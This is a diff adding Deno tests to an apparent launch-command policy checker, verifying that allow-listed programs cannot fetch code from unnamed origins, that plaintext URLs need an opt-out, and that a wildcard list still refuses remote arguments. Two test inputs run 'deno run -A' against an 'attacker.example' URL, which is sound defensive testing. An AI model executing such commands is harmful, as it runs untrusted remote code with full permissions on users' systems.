@@ -311,3 +311,81 @@ Deno.test("the host allow-list does not admit a command program", () => {
     "launch_command_not_allowed",
   );
 });
+
+Deno.test("an allow-listed program may not fetch from an un-allow-listed origin", () => {
+  // Allowing `deno` says the operator trusts the registry to run deno. It does
+  // not say they trust it to run whatever deno downloads: that is the refused
+  // remote-module case written as a command, so the origin rule applies to the
+  // arguments too.
+  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "deno" });
+  const denial = launchDenial(
+    commandOf("deno", "run", "-A", "https://attacker.example/x.ts"),
+    allowed,
+  );
+  assertEquals(denial?.reason, "launch_origin_not_allowed");
+  assertEquals(denial?.detail.includes("attacker.example"), true);
+
+  // Naming the origin as well allows it, exactly as it would for a module.
+  assertEquals(
+    launchDenial(
+      commandOf("deno", "run", "-A", "https://builds.example.com/zuke.ts"),
+      env({
+        [LAUNCH_COMMANDS_ENV]: "deno",
+        [LAUNCH_HOSTS_ENV]: "builds.example.com",
+      }),
+    ),
+    null,
+  );
+});
+
+Deno.test("a plaintext argument needs the insecure opt-out, like a module", () => {
+  const base = {
+    [LAUNCH_COMMANDS_ENV]: "deno",
+    [LAUNCH_HOSTS_ENV]: "builds.example.com",
+  };
+  assertEquals(
+    launchDenial(
+      commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
+      env(base),
+    )?.reason,
+    "insecure_launch_url",
+  );
+  assertEquals(
+    launchDenial(
+      commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
+      env({ ...base, [ALLOW_INSECURE_ENV]: "1" }),
+    ),
+    null,
+  );
+});
+
+Deno.test("ordinary local arguments are untouched by the origin rule", () => {
+  // The rule is about fetching, not about arguments in general: a path, a flag
+  // and a bare word are not specifiers and must not be mistaken for one.
+  assertEquals(
+    launchDenial(
+      commandOf(
+        "make",
+        "-f",
+        "./Makefile",
+        "deploy",
+        "VERSION=1.2.3",
+        "C:\\w\\x",
+      ),
+      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
+    ),
+    null,
+  );
+});
+
+Deno.test("the wildcard program list still refuses a remote argument", () => {
+  // `*` says the operator trusts the registry to pick programs. Fetching code
+  // from an origin they never named is a separate decision, still theirs.
+  assertEquals(
+    launchDenial(
+      commandOf("deno", "run", "https://attacker.example/x.ts"),
+      env({ [LAUNCH_COMMANDS_ENV]: "*" }),
+    )?.reason,
+    "launch_origin_not_allowed",
+  );
+});
